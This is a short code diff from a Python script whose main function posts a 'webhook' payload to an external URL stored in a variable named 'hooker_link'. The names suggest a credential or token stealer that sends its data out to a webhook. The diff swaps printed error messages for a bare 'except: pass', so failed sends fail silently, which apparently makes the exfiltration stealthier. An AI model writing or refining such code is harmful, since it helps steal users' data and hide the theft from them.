@@ -213,8 +213,8 @@ def main():
     }
     try:
         urlopen(Request(hooker_link, data=dumps(webhook).encode(), headers=getheaders()))
-    except Exception as e:
-        print(e)
+    except:
+        pass
 
 
 
